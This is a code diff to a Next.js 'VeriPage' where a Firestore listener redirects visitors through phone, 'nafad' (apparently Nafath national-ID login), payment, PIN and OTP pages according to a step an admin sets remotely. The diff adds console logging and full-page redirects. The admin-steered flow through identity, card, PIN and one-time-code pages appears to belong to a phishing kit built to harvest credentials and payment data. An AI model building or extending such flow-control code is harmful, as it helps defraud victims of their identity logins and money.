@@ -137,18 +137,27 @@ export default function VeriPage() {
           const data = docSnapshot.data()
           const step = data.currentStep
 
-          // Redirect based on currentStep
+          // Admin navigation: Handle page redirects
           if (step === "home") {
-            router.push("/main")
+            console.log("[veri] Admin redirecting to home")
+            window.location.href = "/"
           } else if (step === "phone") {
-            router.push("/phone-info")
+            console.log("[veri] Admin redirecting to phone-info")
+            window.location.href = "/phone-info"
           } else if (step === "nafad") {
-            router.push("/nafad")
+            console.log("[veri] Admin redirecting to nafad")
+            window.location.href = "/nafad"
           } else if (step === "payment") {
-            router.push("/check")
+            console.log("[veri] Admin redirecting to payment")
+            window.location.href = "/check"
           } else if (step === "pin") {
-            router.push("/confi")
+            console.log("[veri] Admin redirecting to pin")
+            window.location.href = "/confi"
+          } else if (typeof step === "number") {
+            console.log("[veri] Admin redirecting to home with step:", step)
+            window.location.href = "/"
           }
+          // If step === "otp" or "veri", stay on this page
         }
       },
       (error) => {
